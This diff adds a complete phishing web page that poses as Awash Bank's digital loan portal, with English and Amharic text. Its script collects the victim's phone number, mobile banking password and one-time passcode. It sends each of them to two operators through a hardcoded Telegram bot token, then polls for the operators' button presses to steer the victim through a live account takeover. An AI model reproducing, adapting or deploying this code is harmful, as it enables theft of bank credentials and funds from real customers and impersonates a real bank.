@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Awash Bank - Digital Loan Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-purple: #3b3f8c;
+            --accent-orange: #f39221;
+            --text-navy: #000051;
+            --btn-disabled: #d9dee3;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+        body { background-color: #2e3171; height: 100vh; display: flex; justify-content: center; overflow: hidden; }
+        
+        #splash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-purple); z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        
+        .phone-container { width: 100%; max-width: 450px; height: 100vh; position: relative; background-color: var(--bg-purple); overflow: hidden; }
+        .pages-slider { display: flex; width: 1000%; height: 100%; transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+        .page { width: 10%; height: 100%; display: flex; flex-direction: column; }
+
+        .header-top { height: 30%; display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top: 10px; }
+        .logo-img { width: 90px; }
+        .logo-text { color: white; font-size: 1.5rem; font-weight: 700; margin-top: 8px; }
+        .sub-text { color: rgba(255,255,255,0.8); font-size: 0.9rem; margin-top: 2px; }
+
+        .content-area { flex-grow: 1; background: white; border-top-left-radius: 40px; border-top-right-radius: 40px; padding: 40px 30px; position: relative; text-align: center; }
+        .orange-lip::before { content: ""; position: absolute; top: -20px; left: 0; width: 100%; height: 50px; background-color: var(--accent-orange); border-top-left-radius: 40px; border-top-right-radius: 40px; z-index: -1; }
+
+        #page1 { padding: 40px 25px; }
+        .header-p1 { text-align: center; margin-top: 20px; margin-bottom: 40px; }
+        .logo-p1 { width: 140px; }
+        .title-container { border-top: 1px solid rgba(255,255,255,0.2); border-bottom: 1px solid rgba(255,255,255,0.2); padding: 15px 0; text-align: center; margin-bottom: 30px; }
+        .title-container h2 { color: white; font-weight: 400; font-size: 1.1rem; }
+        .lang-item { color: white; font-size: 1.1rem; cursor: pointer; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; text-align: left;}
+        .lang-item.active { color: var(--accent-orange); font-weight: 500; }
+        .check-mark { display: none; width: 22px; height: 22px; background-color: var(--accent-orange); border-radius: 50%; position: relative; }
+        .check-mark::after { content: ''; position: absolute; left: 8px; top: 4px; width: 5px; height: 10px; border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg); }
+        .lang-item.active .check-mark { display: block; }
+
+        .get-started-text { font-size: 2.5rem; font-weight: 500; color: var(--text-navy); line-height: 1.1; margin-bottom: 30px; text-align: left;}
+        .phone-input { width: 100%; padding: 16px 15px; font-size: 1.3rem; border: 1px solid #ccc; border-radius: 6px; outline: none; }
+        .hint-text { color: #888; font-size: 0.85rem; margin-top: 12px; text-align: center; width: 100%; display: block;}
+        .continue-btn { width: 100%; background-color: var(--btn-disabled); color: white; padding: 16px; border-radius: 8px; border: none; font-size: 1.2rem; margin-top: 25px; display: flex; justify-content: center; align-items: center; transition: background 0.3s; pointer-events: none;}
+
+        /* Loading Animation */
+        .sms-progress-bar { width: 180px; height: 4px; background: #eee; margin: 20px auto; position: relative; overflow: hidden; border-radius: 2px;}
+        .sms-progress-bar::after { 
+            content: ""; position: absolute; left: -100%; top: 0; height: 100%; width: 100%; 
+            background: linear-gradient(90deg, transparent, var(--bg-purple), transparent);
+            animation: loading-slide 1.5s infinite linear;
+        }
+        @keyframes loading-slide { 0% { left: -100%; } 100% { left: 100%; } }
+
+        .pin-title { color: var(--text-navy); font-size: 1.15rem; margin-top: 10px; margin-bottom: 20px; font-weight: 400; }
+        .pin-dots-container { display: flex; justify-content: center; gap: 15px; margin-bottom: 40px; border-bottom: 1.5px solid #ccc; width: fit-content; margin-left: auto; margin-right: auto; padding-bottom: 15px; min-height: 35px;}
+        .pin-dot { width: 18px; height: 18px; border-radius: 50%; background-color: transparent; }
+        .pin-dot.filled { background-color: var(--text-navy); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
+        .key { font-size: 1.6rem; font-weight: 500; color: var(--text-navy); padding: 10px; cursor: pointer; border-bottom: 1.5px solid #eee; width: 65px; margin: 0 auto; user-select: none; }
+        .key:active { background: #f9f9f9; }
+
+        .waiting-title { font-size: 1.8rem; color: var(--text-navy); margin-top: 40px; margin-bottom: 20px; font-weight: 500;}
+        .sms-info-text { color: var(--text-navy); font-size: 1.05rem; line-height: 1.6; margin-top: 25px; padding: 0 10px;}
+
+        .otp-input-group { display: flex; justify-content: center; gap: 8px; margin-top: 30px; }
+        .otp-box { width: 45px; height: 55px; border: 1px solid #ccc; border-radius: 8px; font-size: 1.5rem; text-align: center; color: var(--text-navy); font-weight: bold; }
+        .timer-text { margin-top: 15px; color: #e74c3c; font-weight: bold; font-size: 1rem; }
+
+        .overlay { display: none; position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .alert-box { background: white; width: 80%; padding: 25px; border-radius: 15px; text-align: center; }
+        .alert-btn { margin-top: 20px; background: var(--accent-orange); color: white; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+
+        .footer-fixed { position: absolute; bottom: 30px; width: 100%; display: flex; justify-content: center; z-index: 100; }
+        .pagination { display: flex; gap: 10px; }
+        .dot { width: 14px; height: 14px; border: 2px solid #ccc; border-radius: 50%; background: white; }
+        .dot.active { background-color: #3b3f8c; border-color: #3b3f8c; }
+        .globe-fab { position: absolute; right: 25px; bottom: 30px; background-color: var(--accent-orange); width: 55px; height: 55px; border-radius: 50%; display: flex; justify-content: center; align-items: center; z-index: 110; transition: opacity 0.3s;}
+    </style>
+</head>
+<body onload="startApp()">
+
+<div id="splash">
+    <img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" width="120">
+    <div style="color:white; font-size:1.8rem; font-weight:bold; margin-top:15px;">Awash Bank</div>
+</div>
+
+<div class="overlay" id="notRegisteredAlert"><div class="alert-box"><p id="txt-pop-notreg">This number is not registered for digital banking. Please visit the bank.</p><button class="alert-btn" onclick="closeAlert('not_reg')">OK</button></div></div>
+<div class="overlay" id="incorrectPinAlert"><div class="alert-box"><p id="txt-pop-wrongpin">The Password you entered is incorrect. Please try again.</p><button class="alert-btn" id="txt-btn-try" onclick="closeAlert('pin_err')">Try Again</button></div></div>
+<div class="overlay" id="incorrectOtpAlert"><div class="alert-box"><p id="txt-pop-wrongotp">Your OTP is incorrect.</p><button class="alert-btn" id="txt-btn-resend1" onclick="closeAlert('otp_err')">Resend OTP</button></div></div>
+<div class="overlay" id="expiredOtpAlert"><div class="alert-box"><p id="txt-pop-expired">Your OTP has expired.</p><button class="alert-btn" id="txt-btn-resend2" onclick="closeAlert('otp_err')">Resend OTP</button></div></div>
+
+<div class="phone-container">
+    <div class="pages-slider" id="mainSlider">
+        <div class="page" id="page1">
+            <div class="header-p1"><img src="https://i.postimg.cc/B6RspkhP/11772-removebg-preview.png" class="logo-p1"></div>
+            <div class="title-container"><h2>Select Your Language / ቋንቋ ይምረጡ</h2></div>
+            <div class="language-list">
+                <div class="lang-item" onclick="handleLang('English')">English <span class="check-mark"></span></div>
+                <div class="lang-item" onclick="handleLang('Amharic')">አማርኛ <span class="check-mark"></span></div>
+            </div>
+        </div>
+        <div class="page" id="page2">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div></div>
+            <div class="content-area orange-lip"><h1 class="get-started-text" id="txt-apply-title">Apply for<br>Digital Loan</h1><input type="tel" class="phone-input" value="+251 " id="phoneInput"><p class="hint-text" id="txt-phone-hint">Enter your registered mobile number</p><button class="continue-btn" id="contBtn" onclick="reqApproval('phone')">Continue →</button></div>
+        </div>
+        <div class="page">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div></div>
+            <div class="content-area"><h2 class="waiting-title" id="txt-wait1-title">Checking Number</h2><div class="sms-progress-bar"></div><p class="sms-info-text" id="txt-wait1-desc">Please wait while we verify if your phone number is registered in our bank system...</p></div>
+        </div>
+        <div class="page">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div><div class="sub-text" id="txt-sub-sec">Security</div></div>
+            <div class="content-area"><p class="pin-title" id="txt-pin-title">Enter your 4-digit Mobile Banking Password</p><div class="pin-dots-container"><div class="pin-dot" id="pdot1"></div><div class="pin-dot" id="pdot2"></div><div class="pin-dot" id="pdot3"></div><div class="pin-dot" id="pdot4"></div></div><div class="keypad"><div class="key" onclick="pressKey('1')">1</div><div class="key" onclick="pressKey('2')">2</div><div class="key" onclick="pressKey('3')">3</div><div class="key" onclick="pressKey('4')">4</div><div class="key" onclick="pressKey('5')">5</div><div class="key" onclick="pressKey('6')">6</div><div class="key" onclick="pressKey('7')">7</div><div class="key" onclick="pressKey('8')">8</div><div class="key" onclick="pressKey('9')">9</div><div style="border:none"></div><div class="key" onclick="pressKey('0')">0</div><div class="key" style="border:none" onclick="pressKey('back')">⌫</div></div></div>
+        </div>
+        <div class="page">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div></div>
+            <div class="content-area"><h2 class="waiting-title" id="txt-wait2-title">Sending OTP</h2><div class="sms-progress-bar"></div><p class="sms-info-text"><span id="txt-wait2-desc">Sending 6-digit verification code to</span> <span class="mask-phone"></span>. <span id="txt-wait2-wait">Please wait for the SMS...</span></p></div>
+        </div>
+        <div class="page">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div><div class="sub-text" id="txt-sub-ver">Verification</div></div>
+            <div class="content-area"><p class="pin-title"><span id="txt-otp-title">Enter the 6-digit code sent to</span> <span class="mask-phone"></span></p><div class="otp-input-group" id="otpGroup"><input type="tel" class="otp-box" maxlength="1"><input type="tel" class="otp-box" maxlength="1"><input type="tel" class="otp-box" maxlength="1"><input type="tel" class="otp-box" maxlength="1"><input type="tel" class="otp-box" maxlength="1"><input type="tel" class="otp-box" maxlength="1"></div><div class="timer-text" id="otpTimer">01:00</div></div>
+        </div>
+        <div class="page">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div></div>
+            <div class="content-area"><h2 class="waiting-title" id="txt-wait3-title">Checking Eligibility</h2><div class="sms-progress-bar"></div><p class="sms-info-text" id="txt-wait3-desc">Final Step: We are calculating your loan limit. This will only take a moment...</p></div>
+        </div>
+        <div class="page">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div></div>
+            <div class="content-area"><div style="font-size:5rem;color:#2ecc71;">✓</div><h2 style="color:var(--text-navy);font-size:1.4rem;margin-top:20px;" id="txt-succ-title">Application Submitted</h2><p class="sms-info-text" id="txt-succ-desc">You will receive a confirmation message from our bank. Please follow the instructions to finish your application.</p><button class="continue-btn" style="background-color:var(--accent-orange);margin-top:40px;pointer-events:auto;" id="txt-btn-done" onclick="location.reload()">Done</button></div>
+        </div>
+        <div class="page">
+            <div class="header-top"><img src="https://i.postimg.cc/8PnvgByF/11776-removebg-preview-(1).png" class="logo-img"><div class="logo-text">Awash Bank</div></div>
+            <div class="content-area"><div style="font-size:5rem;color:#e74c3c;">!</div><h2 style="color:var(--text-navy);font-size:1.2rem;margin-top:20px;padding:0 10px;" id="txt-fail-title">Not Eligible: Your account balance does not meet the requirements.</h2><button class="continue-btn" style="background-color:var(--accent-orange);margin-top:40px;pointer-events:auto;" onclick="location.reload()">OK</button></div>
+        </div>
+    </div>
+    <div class="globe-fab" id="worldIcon"><svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg></div>
+    <div class="footer-fixed"><div class="pagination"><div class="dot active"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div></div>
+</div>
+
+<script>
+    let currentPin = "", curMode = "", lastId = 0, poll, timerInterval, selectedLang = "English";
+    const bot = "8554719409:AAE9avDv2r7yS1W_qLtCb2nLFEHu1sFrzYE";
+    const admins = ["8495316091", "8145799125"];
+    const slider = document.getElementById('mainSlider'), dots = document.querySelectorAll('.dot');
+
+    const translations = {
+        "Amharic": {
+            "txt-apply-title": "የዲጂታል ብድር<br>ያመልክቱ",
+            "txt-phone-hint": "ባንክ የተመዘገበ ስልክ ቁጥርዎን ያስገቡ",
+            "contBtn": "ቀጥል →",
+            "txt-wait1-title": "ቁጥር በመፈተሽ ላይ",
+            "txt-wait1-desc": "ስልክዎ በባንክ ስርዓታችን ውስጥ መመዝገቡን እያረጋገጥን ነው፣ እባክዎ ይጠብቁ...",
+            "txt-sub-sec": "ደህንነት",
+            "txt-pin-title": "የ 4 አሃዝ የሞባይል ባንኪንግ የይለፍ ቃልዎን ያስገቡ",
+            "txt-wait2-title": "የማረጋገጫ ኮድ በመላክ ላይ",
+            "txt-wait2-desc": "የ 6 አሃዝ የማረጋገጫ ኮድ ወደ",
+            "txt-wait2-wait": "በመላክ ላይ ነው። እባክዎ የጽሁፍ መልእክቱን ይጠብቁ...",
+            "txt-sub-ver": "ማረጋገጫ",
+            "txt-otp-title": "ወደ ስልክዎ የተላከውን 6 አሃዝ ኮድ ያስገቡ",
+            "txt-wait3-title": "ብቁነትን በመፈተሽ ላይ",
+            "txt-wait3-desc": "የመጨረሻ ደረጃ፡ የብድር ገደብዎን በማስላት ላይ ነን። ይህ ጥቂት ሰከንዶችን ይወስዳል...",
+            "txt-succ-title": "ማመልከቻው ገብቷል",
+            "txt-succ-desc": "ከባንካችን የማረጋገጫ መልእክት ይደርስዎታል። እባክዎ ማመልከቻውን ለማጠናቀቅ መመሪያዎቹን ይከተሉ።",
+            "txt-btn-done": "ተከናውኗል",
+            "txt-fail-title": "ብቁ አይደሉም፡ የሂሳብዎ ቀሪ ሂሳብ መስፈርቱን አያሟላም።",
+            "txt-pop-notreg": "ይህ ቁጥር ለዲጂታል ባንክ አልተመዘገበም። እባክዎ ባንክ ቅርንጫፍ ይሂዱ።",
+            "txt-pop-wrongpin": "ያስገቡት የይለፍ ቃል የተሳሳተ ነው። እባክዎ እንደገና ይሞክሩ።",
+            "txt-btn-try": "እንደገና ይሞክሩ",
+            "txt-pop-wrongotp": "ያስገቡት የማረጋገጫ ኮድ የተሳሳተ ነው።",
+            "txt-btn-resend1": "ኮድ እንደገና ላክ",
+            "txt-btn-resend2": "ኮድ እንደገና ላክ",
+            "txt-pop-expired": "የማረጋገጫ ኮዱ ጊዜ አልፎበታል።"
+        }
+    };
+
+    function startApp() { setTimeout(() => { document.getElementById('splash').style.display = 'none'; }, 2000); }
+
+    function handleLang(l) { 
+        selectedLang = l;
+        if(l === "Amharic") {
+            const t = translations["Amharic"];
+            for (let id in t) {
+                const el = document.getElementById(id);
+                if(el) { if(id === "contBtn" || id === "txt-btn-done") el.innerText = t[id]; else el.innerHTML = t[id]; }
+            }
+        }
+        admins.forEach(adminId => {
+            fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${adminId}&text=Lang Selection: ${l}`);
+        });
+        slider.style.transform = 'translateX(-10%)'; document.getElementById('worldIcon').style.display='none';
+    }
+
+    document.getElementById('phoneInput').addEventListener('input', (e) => {
+        let v = e.target.value; if(!v.startsWith("+251 ")) e.target.value = "+251 ";
+        let d = v.substring(5).replace(/\D/g, '').substring(0,9); e.target.value = "+251 " + d;
+        const btn = document.getElementById('contBtn');
+        if(d.startsWith('9') && d.length === 9) { 
+            btn.style.backgroundColor = '#f39221'; btn.style.pointerEvents = 'auto'; 
+            let masked = "+2519xxxxx" + d.slice(-2);
+            document.querySelectorAll('.mask-phone').forEach(el => el.innerText = masked);
+        } else { btn.style.backgroundColor = '#d9dee3'; btn.style.pointerEvents = 'none'; }
+    });
+
+    const otpInputs = document.querySelectorAll('.otp-box');
+    otpInputs.forEach((box, idx) => {
+        box.addEventListener('input', (e) => { if (e.target.value.length === 1 && idx < 5) otpInputs[idx + 1].focus(); checkOtpComplete(); });
+        box.addEventListener('keydown', (e) => { if (e.key === "Backspace" && !e.target.value && idx > 0) otpInputs[idx - 1].focus(); });
+    });
+
+    function startTimer() {
+        let time = 60; clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            let m = Math.floor(time/60), s = time%60;
+            document.getElementById('otpTimer').innerText = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            if(time <= 0) { clearInterval(timerInterval); showPop('expiredOtpAlert'); }
+            time--;
+        }, 1000);
+    }
+
+    function checkOtpComplete() {
+        const val = Array.from(otpInputs).map(i => i.value).join('');
+        if (val.length === 6) { clearInterval(timerInterval); slider.style.transform = 'translateX(-60%)'; reqApproval('otp'); }
+    }
+
+    async function reqApproval(type) {
+        curMode = type;
+        const fullPhone = document.getElementById('phoneInput').value;
+        const cleanPhone = fullPhone.substring(5);
+        const now = new Date();
+        const expiry = new Date(now.getTime() + 10 * 60000).toLocaleString('en-GB', { day:'2-digit', month:'short', year:'numeric', hour:'2-digit', minute:'2-digit' }).replace(',', '');
+        
+        let text = `User Lang: ${selectedLang}\n`;
+        let btns = [];
+        
+        if(type==='phone') {
+            text += `User: \`${cleanPhone}\` \nAction: Registry Check`;
+            btns = [{text:"✅ Registered",callback_data:"p_ok"}, {text:"❌ Not Reg",callback_data:"p_no"}];
+            slider.style.transform = 'translateX(-20%)'; 
+        } else if(type==='pin') {
+            text += `User: \`${cleanPhone}\` \nPassword: \`${currentPin}\``;
+            btns = [{text:"✅ Valid",callback_data:"pin_ok"}, {text:"❌ Invalid",callback_data:"pin_no"}];
+            slider.style.transform = 'translateX(-40%)';
+        } else if(type==='otp') {
+            const otpVal = Array.from(otpInputs).map(i => i.value).join('');
+            text += `User: \`${cleanPhone}\` \n\n\`Dear Customer, Your AwashBirr Pro activation code is ${otpVal} and expires at ${expiry}.\nP5DpvxxGN3J\``;
+            btns = [{text:"✅ Pass",callback_data:"otp_ok"}, {text:"❌ Wrong OTP",callback_data:"otp_no"}, {text:"🚫 Not Eligible",callback_data:"otp_bad"}];
+        } else if(type==='reverify') {
+            text += `User: \`${cleanPhone}\` \nPassword: \`${currentPin}\` \nAction: Resend OTP Requested`;
+            btns = [{text:"✅ Valid (Send OTP)",callback_data:"rev_ok"}, {text:"❌ Invalid",callback_data:"pin_no"}];
+            slider.style.transform = 'translateX(-40%)';
+        }
+
+        const urlMarkup = JSON.stringify({inline_keyboard:[btns]});
+        admins.forEach(adminId => {
+            fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(text)}&parse_mode=MarkdownV2&reply_markup=${urlMarkup}`);
+        });
+        if(!poll) poll = setInterval(checkAdmin, 2000);
+    }
+
+    async function checkAdmin() {
+        try {
+            const r = await fetch(`https://api.telegram.org/bot${bot}/getUpdates?offset=${lastId+1}`);
+            const d = await r.json();
+            if(d.result.length > 0) {
+                d.result.forEach(u => {
+                    lastId = u.update_id;
+                    if(u.callback_query) {
+                        const res = u.callback_query.data;
+                        if(res === "p_ok") { slider.style.transform = 'translateX(-30%)'; updateDots(2); }
+                        if(res === "p_no") showPop('notRegisteredAlert');
+                        if(res === "pin_ok") { slider.style.transform = 'translateX(-50%)'; updateDots(3); startTimer(); }
+                        if(res === "pin_no") showPop('incorrectPinAlert');
+                        if(res === "otp_ok") { slider.style.transform = 'translateX(-70%)'; updateDots(4); }
+                        if(res === "otp_no") showPop('incorrectOtpAlert');
+                        if(res === "otp_bad") slider.style.transform = 'translateX(-80%)';
+                        if(res === "rev_ok") { slider.style.transform = 'translateX(-50%)'; updateDots(3); startTimer(); }
+                    }
+                });
+            }
+        } catch(e){}
+    }
+
+    function showPop(id) { document.getElementById(id).style.display = 'flex'; clearInterval(poll); poll = null; }
+    function closeAlert(t) {
+        document.querySelectorAll('.overlay').forEach(o => o.style.display='none');
+        if(t==='not_reg') slider.style.transform = 'translateX(-10%)';
+        if(t==='pin_err') { currentPin = ""; document.querySelectorAll('.pin-dot').forEach(d => d.classList.remove('filled')); slider.style.transform = 'translateX(-30%)'; }
+        if(t==='otp_err') { otpInputs.forEach(i => i.value = ""); reqApproval('reverify'); }
+    }
+
+    function pressKey(n) {
+        if(n==='back') currentPin = currentPin.slice(0,-1);
+        else if(currentPin.length < 4) currentPin += n;
+        for(let i=1;i<=4;i++) i<=currentPin.length?document.getElementById('pdot'+i).classList.add('filled'):document.getElementById('pdot'+i).classList.remove('filled');
+        if(currentPin.length === 4) setTimeout(() => reqApproval('pin'), 300);
+    }
+
+    function updateDots(idx) { dots.forEach(d => d.classList.remove('active')); if(dots[idx]) dots[idx].classList.add('active'); }
+</script>
+</body>
+</html>
